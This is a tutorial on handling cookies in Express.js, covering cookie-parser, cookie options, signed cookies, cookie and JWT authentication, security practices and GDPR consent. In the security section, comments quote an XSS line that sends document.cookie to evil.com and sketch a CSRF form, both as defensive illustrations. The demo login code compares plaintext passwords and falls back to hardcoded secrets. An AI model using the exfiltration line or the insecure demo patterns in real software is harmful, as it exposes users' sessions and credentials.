
 ![alt text](image.png)

# Cookies in Express.js — A Detailed Guide

---

## Table of Contents

1. [What are Cookies?](#1-what-are-cookies)
2. [How Cookies Work](#2-how-cookies-work)
3. [Setting Up cookie-parser](#3-setting-up-cookie-parser)
4. [Setting Cookies](#4-setting-cookies)
5. [Reading Cookies](#5-reading-cookies)
6. [Deleting Cookies](#6-deleting-cookies)
7. [Cookie Options — Complete Reference](#7-cookie-options--complete-reference)
8. [Signed Cookies](#8-signed-cookies)
9. [Cookies vs localStorage vs Sessions](#9-cookies-vs-localstorage-vs-sessions)
10. [Authentication with Cookies](#10-authentication-with-cookies)
11. [Cookie Security Best Practices](#11-cookie-security-best-practices)
12. [GDPR and Cookie Consent](#12-gdpr-and-cookie-consent)
13. [Common Mistakes](#13-common-mistakes)
14. [Quick Reference Cheatsheet](#14-quick-reference-cheatsheet)

---

## 1. What are Cookies?

A **cookie** is a small piece of data that the **server sends to the
browser**, which the browser stores and automatically sends back with
every subsequent request to the same domain.

```
┌─────────────────────────────────────────────────────────────────┐
│                     WHAT A COOKIE IS                           │
├─────────────────────────────────────────────────────────────────┤
│  Name:  sessionId                                               │
│  Value: abc123xyz                                               │
│  Domain: myapp.com                                              │
│  Path:   /                                                      │
│  Expires: Thu, 01 Jan 2026 00:00:00 GMT                         │
│  HttpOnly: true                                                 │
│  Secure: true                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### What cookies are used for

```
┌──────────────────────┬──────────────────────────────────────────┐
│  Use Case            │  Example                                 │
├──────────────────────┼──────────────────────────────────────────┤
│  Authentication      │  Session ID, JWT token                   │
│  User preferences    │  Theme, language, timezone               │
│  Shopping cart       │  Items added before login                │
│  Tracking            │  Analytics, ad targeting                 │
│  Remember me         │  Keep user logged in for 30 days         │
│  CSRF protection     │  Anti-CSRF token                         │
└──────────────────────┴──────────────────────────────────────────┘
```

### Cookie size limits

```
Maximum size per cookie:  4096 bytes (~4KB)
Maximum cookies per domain: ~50 (varies by browser)
Total cookie storage:     ~80KB per domain
```

---

## 2. How Cookies Work

Cookies flow between client and server through HTTP headers:

```
┌─────────────────────────────────────────────────────────────────┐
│  STEP 1 — First request (no cookie yet)                        │
│                                                                 │
│  Browser → GET / HTTP/1.1                                       │
│             Host: myapp.com                                     │
│             (no Cookie header)                                  │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  STEP 2 — Server sets a cookie in the response                 │
│                                                                 │
│  Server → HTTP/1.1 200 OK                                       │
│            Set-Cookie: sessionId=abc123; HttpOnly; Secure       │
│            Content-Type: text/html                              │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  STEP 3 — Browser stores the cookie                            │
│                                                                 │
│  Browser cookie store:                                          │
│  { name: "sessionId", value: "abc123", domain: "myapp.com" }   │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│  STEP 4 — Every subsequent request automatically includes it   │
│                                                                 │
│  Browser → GET /dashboard HTTP/1.1                              │
│             Host: myapp.com                                     │
│             Cookie: sessionId=abc123   ← automatically added   │
└─────────────────────────────────────────────────────────────────┘
```

### The Set-Cookie and Cookie headers

```
Server sends:
  Set-Cookie: username=Alice; Max-Age=86400; HttpOnly; Secure; SameSite=Strict

Browser sends back every time:
  Cookie: username=Alice

Multiple cookies:
  Cookie: sessionId=abc123; username=Alice; theme=dark
```

---

## 3. Setting Up cookie-parser

Express does not parse cookies by default. The `cookie-parser`
middleware reads the `Cookie` header and populates `req.cookies`
and `req.signedCookies`.

### Installation

```bash
npm install cookie-parser
```

### Basic setup

```javascript
// server.js
import express      from "express";
import cookieParser from "cookie-parser";

const app  = express();
const PORT = 3000;

// Register cookie-parser BEFORE any routes that use cookies
// Without this: req.cookies → undefined
// With this:    req.cookies → { sessionId: "abc123", theme: "dark" }
app.use(cookieParser());

// For signed cookies — pass a secret string
// The secret is used to sign cookie values so you can verify they
// haven't been tampered with by the client
app.use(cookieParser("my-super-secret-key"));
// In production always use process.env.COOKIE_SECRET

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
```

---

## 4. Setting Cookies

Use `res.cookie(name, value, options)` to set a cookie on the client.

### Basic cookie

```javascript
// GET /set-cookie
app.get("/set-cookie", (req, res) => {
  // res.cookie(name, value, options)
  // Sends Set-Cookie header in the response
  res.cookie("username", "Alice");

  res.send("Cookie has been set!");
  // Browser now stores: username=Alice
  // It sends it back with every future request to this domain
});
```

### Cookie with options

```javascript
app.get("/set-cookie-options", (req, res) => {
  res.cookie("sessionId", "abc123xyz", {
    httpOnly: true,             // cannot be read by browser JavaScript
    secure:   true,             // only sent over HTTPS
    maxAge:   24 * 60 * 60 * 1000, // expires in 24 hours (milliseconds)
    sameSite: "strict",         // only sent for same-site requests
    path:     "/",              // available to all paths on this domain
  });

  res.json({ message: "Secure cookie set" });
});
```

### Multiple cookies at once

```javascript
app.get("/set-multiple", (req, res) => {
  // Chain multiple res.cookie() calls before sending the response
  res.cookie("username",  "Alice",  { maxAge: 86400000, httpOnly: true })
     .cookie("theme",     "dark",   { maxAge: 86400000 })
     .cookie("language",  "en",     { maxAge: 86400000 })
     .json({ message: "Multiple cookies set" });
});
```

### Session cookie vs Persistent cookie

```javascript
// SESSION cookie — deleted when the browser is closed
// No maxAge or expires → browser treats it as session-only
app.get("/set-session-cookie", (req, res) => {
  res.cookie("tempToken", "xyz789");
  // Deleted when user closes the browser tab/window
  res.send("Session cookie set — disappears when browser closes");
});

// PERSISTENT cookie — survives browser restarts until expiry
app.get("/set-persistent-cookie", (req, res) => {
  res.cookie("rememberMe", "true", {
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  });
  res.send("Persistent cookie set — lasts 30 days");
});
```

### Cookie with an expiry date

```javascript
app.get("/set-expires", (req, res) => {
  // Option 1 — maxAge (milliseconds from now)
  res.cookie("token", "abc", { maxAge: 3600000 }); // 1 hour

  // Option 2 — expires (specific Date object)
  const oneWeekFromNow = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
  res.cookie("token", "abc", { expires: oneWeekFromNow });

  // Prefer maxAge — it's simpler and doesn't depend on clock sync
  res.send("Cookie with expiry set");
});
```

### Storing objects in cookies

```javascript
// Cookies only store strings — JSON.stringify objects before saving
app.get("/set-object", (req, res) => {
  const userPrefs = {
    theme:    "dark",
    language: "en",
    fontSize: "large",
  };

  // Stringify the object and store as a string
  res.cookie("preferences", JSON.stringify(userPrefs), {
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  });

  res.json({ message: "Preferences saved" });
});
```

---

## 5. Reading Cookies

After `cookie-parser` is registered, all cookies sent by the browser
are available on `req.cookies` as a plain JavaScript object.

```javascript
// GET /read-cookies
app.get("/read-cookies", (req, res) => {
  // req.cookies — object of all cookies sent by the browser
  // { username: "Alice", theme: "dark", sessionId: "abc123" }
  console.log("All cookies:", req.cookies);

  // Read a specific cookie by name
  const username  = req.cookies.username;
  const theme     = req.cookies.theme;
  const sessionId = req.cookies["sessionId"]; // bracket notation also works

  // A cookie that was not set returns undefined
  const missing = req.cookies.nonExistent; // → undefined

  res.json({
    username,
    theme,
    sessionId,
    allCookies: req.cookies,
  });
});
```

### Reading a JSON-stringified cookie

```javascript
app.get("/read-preferences", (req, res) => {
  const rawPrefs = req.cookies.preferences;

  if (!rawPrefs) {
    return res.json({ preferences: null });
  }

  try {
    // Parse the JSON string back into an object
    const preferences = JSON.parse(rawPrefs);
    res.json({ preferences });
  } catch (err) {
    // JSON.parse throws if the string is malformed
    res.status(400).json({ error: "Invalid preferences cookie" });
  }
});
```

### Middleware that reads a cookie

```javascript
// Middleware to attach user preferences to every request
function loadPreferences(req, res, next) {
  try {
    const rawPrefs = req.cookies.preferences;
    req.preferences = rawPrefs ? JSON.parse(rawPrefs) : {
      theme:    "light",   // defaults
      language: "en",
      fontSize: "medium",
    };
  } catch {
    req.preferences = { theme: "light", language: "en", fontSize: "medium" };
  }
  next();
}

app.use(loadPreferences);

app.get("/dashboard", (req, res) => {
  // req.preferences is available here because of the middleware above
  res.render("dashboard", {
    title:       "Dashboard",
    preferences: req.preferences,
  });
});
```

---

## 6. Deleting Cookies

Use `res.clearCookie(name, options)` to delete a cookie. This
sets the cookie's expiry to the past, instructing the browser
to remove it.

```javascript
// GET /clear-cookie — delete a specific cookie
app.get("/clear-cookie", (req, res) => {
  // Clear a simple cookie
  res.clearCookie("username");

  res.json({ message: "username cookie deleted" });
});

// Clearing a cookie that was set with specific options
// The path and domain options MUST MATCH what was used when setting it
// otherwise the browser won't find the right cookie to delete
app.get("/logout", (req, res) => {
  // If the cookie was set with a path of "/"
  res.clearCookie("sessionId", { path: "/" });

  // Clear multiple cookies at once
  res.clearCookie("authToken");
  res.clearCookie("rememberMe");
  res.clearCookie("preferences");

  res.redirect("/login");
});
```

### Cookie lifecycle

```
res.cookie("token", "abc123", { maxAge: 3600000 })
     → Set-Cookie: token=abc123; Max-Age=3600; Path=/

After 1 hour:
     → Browser automatically deletes the cookie (expired)

res.clearCookie("token")
     → Set-Cookie: token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
     → Browser sees past expiry date → deletes the cookie immediately
```

---

## 7. Cookie Options — Complete Reference

```javascript
res.cookie("name", "value", {

  // ── domain ──────────────────────────────────────────────────
  // Which domain(s) can receive this cookie
  // Default: the domain that set the cookie
  // "." prefix → cookie available to ALL subdomains
  domain: ".myapp.com",
  // Available to: myapp.com, api.myapp.com, admin.myapp.com

  // ── path ────────────────────────────────────────────────────
  // Which URL paths can receive this cookie
  // Default: "/" (all paths)
  // "/admin" → only sent for /admin, /admin/users, /admin/*, etc.
  path: "/",

  // ── maxAge ──────────────────────────────────────────────────
  // How long the cookie lives, in MILLISECONDS from now
  // After this time the browser auto-deletes it
  // Prefer over "expires" — simpler and doesn't rely on clock sync
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days

  // ── expires ─────────────────────────────────────────────────
  // Specific Date when the cookie should expire
  // If both maxAge and expires are set, maxAge takes priority
  expires: new Date("2026-12-31"),

  // ── httpOnly ────────────────────────────────────────────────
  // When TRUE: JavaScript in the browser CANNOT read this cookie
  //   document.cookie will NOT show it
  //   Fetch/XHR cannot read it
  // Protects against XSS attacks stealing the cookie
  // ALWAYS set this for auth cookies (session IDs, JWT tokens)
  httpOnly: true,

  // ── secure ──────────────────────────────────────────────────
  // When TRUE: cookie is ONLY sent over HTTPS connections
  // In HTTP (development) the cookie won't be sent → use false locally
  // ALWAYS true in production
  secure: process.env.NODE_ENV === "production",

  // ── sameSite ────────────────────────────────────────────────
  // Controls when the cookie is sent for cross-site requests
  // Protects against CSRF attacks
  //
  // "strict" → only sent for same-site requests
  //   User clicks a link from another site → cookie NOT sent
  //   Best security, but breaks some OAuth/SSO flows
  //
  // "lax"    → sent for same-site + top-level GET navigations
  //   User clicks a link from Google → cookie IS sent (GET only)
  //   Good balance of security and usability — recommended default
  //
  // "none"   → sent for ALL requests including cross-site
  //   Required for third-party cookies and embedded widgets
  //   MUST be combined with secure: true
  sameSite: "lax",

  // ── signed ──────────────────────────────────────────────────
  // When TRUE: the value is signed with the secret passed to cookieParser()
  // Read via req.signedCookies instead of req.cookies
  // If tampered, the value will be false instead of the original value
  signed: true,

  // ── encode ──────────────────────────────────────────────────
  // Custom encoding function for the cookie value
  // Default: encodeURIComponent (handles special chars)
  encode: encodeURIComponent,

  // ── priority ────────────────────────────────────────────────
  // Cookie priority hint for browsers (experimental)
  // "low" | "medium" | "high"
  priority: "medium",

});
```

### Quick options summary table

```
┌──────────────┬──────────────┬───────────────────────────────────┐
│ Option       │ Default      │ Purpose                           │
├──────────────┼──────────────┼───────────────────────────────────┤
│ domain       │ current host │ Which domains receive the cookie  │
│ path         │ "/"          │ Which paths receive the cookie    │
│ maxAge       │ (session)    │ Expiry in milliseconds            │
│ expires      │ (session)    │ Expiry as Date object             │
│ httpOnly     │ false        │ Block JS access → prevent XSS     │
│ secure       │ false        │ HTTPS only                        │
│ sameSite     │ "lax"        │ CSRF protection                   │
│ signed       │ false        │ Tamper detection via signature    │
└──────────────┴──────────────┴───────────────────────────────────┘
```

---

## 8. Signed Cookies

A **signed cookie** has its value cryptographically signed with a
secret key. If anyone modifies the cookie value in the browser,
the signature check fails and Express rejects it.

```
Unsigned cookie:  theme=dark
  → Anyone can open DevTools and change it to "light" or anything else
  → Server has no way to know it was tampered with

Signed cookie:  theme=s%3Adark.HmacSHA256Signature
  → Value is "dark" + a cryptographic signature
  → If changed to "light", the signature no longer matches
  → Server detects tampering → returns false
```

### Setup

```javascript
import cookieParser from "cookie-parser";

// Pass a secret to enable signed cookies
// The secret should be a long, random, unpredictable string
app.use(cookieParser(process.env.COOKIE_SECRET || "my-super-secret-32-char-key!"));
```

### Setting a signed cookie

```javascript
app.get("/set-signed", (req, res) => {
  res.cookie("userId", "user_42", {
    signed:   true,        // MUST be true to sign the cookie
    httpOnly: true,
    maxAge:   86400000,    // 24 hours
  });

  res.json({ message: "Signed cookie set" });
  // Browser stores: userId=s%3Auser_42.HMAC_SIGNATURE
  // The "s%3A" prefix indicates it is a signed cookie
});
```

### Reading a signed cookie

```javascript
app.get("/read-signed", (req, res) => {
  // Signed cookies are on req.signedCookies — NOT req.cookies
  // req.cookies.userId → the raw signed string (not useful)
  // req.signedCookies.userId → the verified original value OR false

  const userId = req.signedCookies.userId;

  if (userId === false) {
    // false means the signature check failed — cookie was tampered with
    return res.status(403).json({ error: "Cookie has been tampered with!" });
  }

  if (!userId) {
    // undefined means the cookie was not sent at all
    return res.status(401).json({ error: "No userId cookie found" });
  }

  // Signature verified — value is genuine
  res.json({ userId, message: "Signed cookie verified successfully" });
});
```

### Signed vs unsigned — when to use which

```
Use SIGNED cookies for:
  → User IDs, role info, any value that controls access
  → Anything the user should not be able to modify

Use UNSIGNED cookies for:
  → Theme, language, display preferences
  → Non-sensitive settings the user can legitimately change
```

---

## 9. Cookies vs localStorage vs Sessions

Understanding when to use each storage mechanism is critical:

```
┌──────────────────┬──────────────────────────────────────────────┐
│                  │  COOKIES                                     │
├──────────────────┼──────────────────────────────────────────────┤
│ Where stored     │  Browser, sent to server automatically       │
│ Accessible by    │  Server + browser JS (unless httpOnly)       │
│ Max size         │  4KB per cookie                              │
│ Expires          │  Set by server (maxAge / expires)            │
│ Sent with req    │  Yes — automatically on every request        │
│ Best for         │  Auth tokens, session IDs, preferences       │
│ Security         │  httpOnly + secure + sameSite = good         │
└──────────────────┴──────────────────────────────────────────────┘

┌──────────────────┬──────────────────────────────────────────────┐
│                  │  localStorage                                │
├──────────────────┼──────────────────────────────────────────────┤
│ Where stored     │  Browser only — never sent to server         │
│ Accessible by    │  Browser JS only (vulnerable to XSS)         │
│ Max size         │  5–10MB                                      │
│ Expires          │  Never — persists until explicitly cleared   │
│ Sent with req    │  No — must add manually to headers           │
│ Best for         │  Non-sensitive UI state, cached API data     │
│ Security         │  ❌ Do NOT store auth tokens here            │
└──────────────────┴──────────────────────────────────────────────┘

┌──────────────────┬──────────────────────────────────────────────┐
│                  │  SERVER SESSIONS (express-session)           │
├──────────────────┼──────────────────────────────────────────────┤
│ Where stored     │  Server (memory, Redis, DB)                  │
│ Accessible by    │  Server only — client gets a session ID      │
│ Max size         │  Unlimited (on the server)                   │
│ Expires          │  Configurable                                │
│ Sent with req    │  Session ID sent via cookie automatically    │
│ Best for         │  Sensitive data, shopping cart, auth state   │
│ Security         │  ✅ Best for sensitive data                  │
└──────────────────┴──────────────────────────────────────────────┘
```

### Decision guide

```
Storing a user preference (theme, language)?
  → Cookie (small, needs to reach the server for SSR)
  → OR localStorage (if client-side rendering only)

Storing an auth token?
  → Cookie with httpOnly: true (cannot be stolen by XSS)
  → NEVER localStorage

Storing sensitive user data (cart, profile)?
  → Server session (data stays on server, only session ID in cookie)

Caching large API responses client-side?
  → localStorage (larger storage, no network overhead)
```

---

## 10. Authentication with Cookies

### Simple login with a signed cookie

```javascript
import express      from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser(process.env.COOKIE_SECRET || "secret-key-32-chars-long!"));

// Simulated user database
const users = [
  { id: 1, email: "alice@example.com", password: "password123", name: "Alice" },
  { id: 2, email: "john@example.com",  password: "password456", name: "John"  },
];

// ── Authentication Middleware ─────────────────────────────────
function isAuthenticated(req, res, next) {
  // Read the signed userId cookie
  const userId = req.signedCookies.userId;

  if (!userId) {
    // No cookie → not logged in → redirect to login page
    return res.redirect("/login");
  }

  // Find the user by the ID stored in the cookie
  const user = users.find(u => u.id === Number(userId));
  if (!user) {
    // Cookie has a userId that doesn't exist (deleted user?)
    res.clearCookie("userId");
    return res.redirect("/login");
  }

  // Attach the user to the request object for downstream use
  req.user = user;
  next();
}

// ── GET /login — show login form ──────────────────────────────
app.get("/login", (req, res) => {
  // If already logged in, skip the login page
  if (req.signedCookies.userId) {
    return res.redirect("/dashboard");
  }
  res.send(`
    <h1>Login</h1>
    <form action="/login" method="POST">
      <input type="email"    name="email"    placeholder="Email"    required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <label>
        <input type="checkbox" name="rememberMe"> Remember me for 30 days
      </label><br>
      <button type="submit">Log In</button>
    </form>
  `);
});

// ── POST /login — process credentials ────────────────────────
app.post("/login", (req, res) => {
  const { email, password, rememberMe } = req.body;

  // Find user by email and password
  const user = users.find(u => u.email === email && u.password === password);

  if (!user) {
    return res.status(401).send(`
      <p style="color:red">Invalid email or password</p>
      <a href="/login">Try again</a>
    `);
  }

  // Determine cookie lifetime based on "remember me"
  const cookieOptions = {
    httpOnly: true,
    secure:   process.env.NODE_ENV === "production",
    sameSite: "lax",
    signed:   true,
  };

  if (rememberMe === "on") {
    // "Remember me" checked → persistent cookie for 30 days
    cookieOptions.maxAge = 30 * 24 * 60 * 60 * 1000;
  }
  // "Remember me" NOT checked → session cookie (no maxAge)
  // Deleted when the browser closes

  // Store the user ID in a signed cookie
  res.cookie("userId", String(user.id), cookieOptions);

  res.redirect("/dashboard");
});

// ── GET /dashboard — protected route ─────────────────────────
app.get("/dashboard", isAuthenticated, (req, res) => {
  res.send(`
    <h1>Welcome, ${req.user.name}!</h1>
    <p>You are logged in as ${req.user.email}</p>
    <a href="/logout">Log Out</a>
  `);
});

// ── GET /profile — another protected route ────────────────────
app.get("/profile", isAuthenticated, (req, res) => {
  res.json({
    id:    req.user.id,
    name:  req.user.name,
    email: req.user.email,
  });
});

// ── GET /logout — clear auth cookie ──────────────────────────
app.get("/logout", (req, res) => {
  // Delete the auth cookie → user is now logged out
  res.clearCookie("userId");
  res.redirect("/login");
});

app.listen(3000, () => console.log("Server at http://localhost:3000"));
```

### JWT in an HttpOnly cookie

A popular pattern for SPAs — store the JWT in an HttpOnly cookie
so JavaScript can't access it (XSS protection), but it's still
sent automatically with every request:

```javascript
import jwt from "jsonwebtoken"; // npm install jsonwebtoken

const JWT_SECRET = process.env.JWT_SECRET || "jwt-secret-key";

// ── POST /api/login — issue JWT in a cookie ───────────────────
app.post("/api/login", (req, res) => {
  const { email, password } = req.body;
  const user = users.find(u => u.email === email && u.password === password);

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Create a JWT with user info
  const token = jwt.sign(
    { id: user.id, name: user.name, role: user.role || "user" },
    JWT_SECRET,
    { expiresIn: "1d" }  // token expires in 1 day
  );

  // Store JWT in an HttpOnly cookie — JS cannot access it
  res.cookie("token", token, {
    httpOnly: true,
    secure:   process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge:   24 * 60 * 60 * 1000,  // 1 day (matches token expiry)
  });

  res.json({ message: `Welcome, ${user.name}!` });
});

// ── JWT auth middleware ───────────────────────────────────────
function verifyJWT(req, res, next) {
  const token = req.cookies.token; // read from HttpOnly cookie

  if (!token) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded; // { id, name, role, iat, exp }
    next();
  } catch (err) {
    // Token expired or invalid
    res.clearCookie("token");
    return res.status(401).json({ error: "Invalid or expired token" });
  }
}

// ── Protected API route ───────────────────────────────────────
app.get("/api/me", verifyJWT, (req, res) => {
  res.json({ user: req.user });
});

// ── POST /api/logout — remove the JWT cookie ─────────────────
app.post("/api/logout", (req, res) => {
  res.clearCookie("token");
  res.json({ message: "Logged out successfully" });
});
```

---

## 11. Cookie Security Best Practices

### The secure cookie recipe for production

```javascript
// ✅ Production-ready auth cookie settings
res.cookie("sessionId", sessionId, {
  httpOnly: true,     // JS cannot access it → blocks XSS theft
  secure:   true,     // HTTPS only → blocks network sniffing
  sameSite: "lax",    // blocks CSRF from cross-site forms
  maxAge:   86400000, // 24 hours → auto-expires
  path:     "/",      // available everywhere
});
```

### httpOnly — prevent XSS theft

```javascript
// Without httpOnly — JavaScript can read the cookie
// A malicious script injected via XSS could steal it:
// document.cookie → "sessionId=abc123; username=Alice"
// fetch("https://evil.com?data=" + document.cookie)

// With httpOnly — JavaScript cannot read the cookie at all
res.cookie("sessionId", "abc123", { httpOnly: true });
// document.cookie shows nothing for this cookie ✅
// XSS attack cannot steal it ✅
```

### secure — prevent man-in-the-middle

```javascript
// Without secure — cookie is sent over HTTP (plain text)
// Anyone on the same network can intercept and read it ❌

// With secure — cookie is only sent over HTTPS (encrypted)
res.cookie("sessionId", "abc123", { secure: true });
// Not sent over HTTP → safe from network sniffing ✅

// In development (no HTTPS) use conditional:
res.cookie("sessionId", "abc123", {
  secure: process.env.NODE_ENV === "production",
});
```

### sameSite — prevent CSRF

```javascript
// CSRF attack example:
// User is logged in to mybank.com (cookie is set)
// User visits evil.com which has:
//   <form action="https://mybank.com/transfer" method="POST">
//   <input name="amount" value="1000">
//   JavaScript auto-submits the form
// Browser WOULD include the mybank.com cookie → transfer happens!

// With sameSite: "lax":
// The cookie is NOT sent for cross-site POST requests
// The bank transfer form on evil.com → cookie not sent → rejected ✅

res.cookie("sessionId", "abc123", { sameSite: "lax" });
```

### Rotate cookies after login

```javascript
// Always issue a new session ID after a successful login
// Prevents session fixation attacks
app.post("/login", (req, res) => {
  // Delete the old pre-login session cookie
  res.clearCookie("sessionId");

  // ... verify credentials ...

  // Issue a brand new session ID after authentication
  const newSessionId = crypto.randomBytes(32).toString("hex");
  res.cookie("sessionId", newSessionId, {
    httpOnly: true,
    secure:   true,
    sameSite: "lax",
    maxAge:   86400000,
  });

  res.redirect("/dashboard");
});
```

### Never store sensitive data in cookies

```javascript
// ❌ NEVER store sensitive data directly in cookies
res.cookie("user", JSON.stringify({
  password: "plaintext",     // NEVER
  ssn:      "123-45-6789",  // NEVER
  cardNo:   "4111111111111111", // NEVER
}));

// ✅ Store only an ID — keep sensitive data on the server
res.cookie("sessionId", "random-session-id-here", { httpOnly: true });
// Sensitive data is in the server-side session store, keyed by sessionId
```

---

## 12. GDPR and Cookie Consent

Under GDPR (EU) and similar laws, non-essential cookies require
**explicit user consent** before being set.

### Cookie categories

```
┌─────────────────────┬──────────────────────────────────────────┐
│ Category            │ Examples                                 │
├─────────────────────┼──────────────────────────────────────────┤
│ Essential           │ Session ID, auth token, CSRF token       │
│ (no consent needed) │ Shopping cart, security cookies          │
├─────────────────────┼──────────────────────────────────────────┤
│ Functional          │ Language preference, theme, timezone     │
│ (consent needed)    │ "Remember me" settings                   │
├─────────────────────┼──────────────────────────────────────────┤
│ Analytics           │ Google Analytics, Hotjar, Mixpanel       │
│ (consent needed)    │ Page views, session recordings           │
├─────────────────────┼──────────────────────────────────────────┤
│ Marketing           │ Facebook Pixel, Google Ads               │
│ (consent needed)    │ Retargeting, ad conversion tracking      │
└─────────────────────┴──────────────────────────────────────────┘
```

### Simple cookie consent implementation

```javascript
// POST /cookie-consent — user accepts or declines
app.post("/cookie-consent", (req, res) => {
  const { analytics, marketing } = req.body;

  // Essential cookies are always set — no consent needed
  res.cookie("cookieConsent", "given", {
    maxAge:   365 * 24 * 60 * 60 * 1000,  // 1 year
    httpOnly: false,  // JS needs to read this to show/hide the banner
    sameSite: "lax",
  });

  // Only set analytics cookies if user consented
  if (analytics === "true") {
    res.cookie("analyticsEnabled", "true", {
      maxAge: 365 * 24 * 60 * 60 * 1000,
    });
  }

  // Only set marketing cookies if user consented
  if (marketing === "true") {
    res.cookie("marketingEnabled", "true", {
      maxAge: 365 * 24 * 60 * 60 * 1000,
    });
  }

  res.json({ message: "Preferences saved" });
});

// Middleware — check cookie consent before setting non-essential cookies
function requireConsent(category) {
  return (req, res, next) => {
    if (req.cookies[`${category}Enabled`] !== "true") {
      return res.status(403).json({
        error: `${category} cookies not consented to`
      });
    }
    next();
  };
}
```

---

## 13. Common Mistakes

### Mistake 1 — Forgetting cookie-parser

```javascript
// ❌ req.cookies is undefined — no middleware registered
app.get("/profile", (req, res) => {
  console.log(req.cookies); // → undefined (or TypeError)
});

// ✅ Register cookie-parser before any routes
import cookieParser from "cookie-parser";
app.use(cookieParser());
app.get("/profile", (req, res) => {
  console.log(req.cookies); // → { sessionId: "abc123", theme: "dark" }
});
```

### Mistake 2 — Reading signed cookies from wrong object

```javascript
// ❌ Wrong — signed cookies are NOT on req.cookies
const userId = req.cookies.userId;  // → "s%3A1.HmacSign..." (raw, useless)

// ✅ Correct — signed cookies are on req.signedCookies
const userId = req.signedCookies.userId;  // → "1" (verified value)
```

### Mistake 3 — Storing sensitive data in cookies

```javascript
// ❌ The browser can read and modify this
res.cookie("userRole", "admin");
// Anyone can open DevTools → Application → Cookies → change to "admin"

// ✅ Store role server-side, reference by session ID
req.session.userRole = "admin";  // stored on the server
res.cookie("sessionId", req.session.id, { httpOnly: true }); // safe
```

### Mistake 4 — Not matching options when clearing

```javascript
// Cookie was set with:
res.cookie("token", "abc", { path: "/api", httpOnly: true });

// ❌ clearCookie without matching path — won't delete it!
res.clearCookie("token");

// ✅ Must include the same path to clear correctly
res.clearCookie("token", { path: "/api" });
```

### Mistake 5 — Using cookies without httpOnly for auth tokens

```javascript
// ❌ Auth token readable by JavaScript → XSS can steal it
res.cookie("authToken", jwt, { maxAge: 86400000 });
// document.cookie → "authToken=eyJhbGci..."

// ✅ httpOnly prevents JS from reading it
res.cookie("authToken", jwt, { httpOnly: true, maxAge: 86400000 });
// document.cookie → "" (cookie not visible to JS)
```

### Mistake 6 — Setting secure: true in development

```javascript
// ❌ secure: true in development (HTTP) → cookie never sent
// Login works but dashboard shows "not authenticated"
res.cookie("sessionId", id, { secure: true });  // broken in HTTP dev

// ✅ Conditional — secure in production only
res.cookie("sessionId", id, {
  secure: process.env.NODE_ENV === "production",
});
```

---

## 14. Quick Reference Cheatsheet

```
┌───────────────────────────────────────────────────────────────────┐
│                        BASIC USAGE                               │
├───────────────────────────────────────────────────────────────────┤
│  import cookieParser from "cookie-parser";                        │
│  app.use(cookieParser("secret"));   // secret for signed cookies  │
│                                                                   │
│  res.cookie("name", "value", { options });  // set cookie         │
│  req.cookies.name                           // read cookie        │
│  req.signedCookies.name                     // read signed cookie │
│  res.clearCookie("name", { options });      // delete cookie      │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│              PRODUCTION-SAFE AUTH COOKIE                         │
├───────────────────────────────────────────────────────────────────┤
│  res.cookie("sessionId", id, {                                    │
│    httpOnly: true,    // JS cannot read → blocks XSS theft        │
│    secure:   true,    // HTTPS only → blocks sniffing             │
│    sameSite: "lax",   // CSRF protection                          │
│    maxAge:   86400000,// expires in 24 hours                      │
│    signed:   true,    // tamper detection                         │
│  });                                                              │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│                    COOKIE OPTIONS                                 │
├──────────────┬────────────────────────────────────────────────────┤
│ httpOnly     │ true = JS can't read it (XSS protection)           │
│ secure       │ true = HTTPS only                                  │
│ sameSite     │ "strict" / "lax" / "none" (CSRF protection)       │
│ maxAge       │ milliseconds until expiry                          │
│ expires      │ Date object for expiry                             │
│ path         │ URL scope (default "/")                            │
│ domain       │ Domain scope (default current host)                │
│ signed       │ true = use req.signedCookies to read              │
└──────────────┴────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│               STORAGE COMPARISON                                 │
├──────────────────┬────────────────┬───────────────────────────────┤
│                  │ Cookie         │ localStorage  │ Session       │
├──────────────────┼────────────────┼───────────────┼───────────────┤
│ Size             │ 4KB            │ 5–10MB        │ Unlimited     │
│ Sent to server   │ Auto ✅        │ Manual only   │ Via cookie ID │
│ JS readable      │ Optional       │ Always        │ No            │
│ Auth tokens      │ ✅ (httpOnly)  │ ❌ Unsafe     │ ✅ Best       │
└──────────────────┴────────────────┴───────────────┴───────────────┘
```

---

> **Summary:** Cookies are the backbone of web authentication and
> user state. Always use `httpOnly` to block XSS, `secure` for
> HTTPS-only transmission, and `sameSite: "lax"` for CSRF
> protection. Use signed cookies to detect tampering, never store
> sensitive data in cookie values, and always clear the auth cookie
> on logout. Together these practices keep your users safe.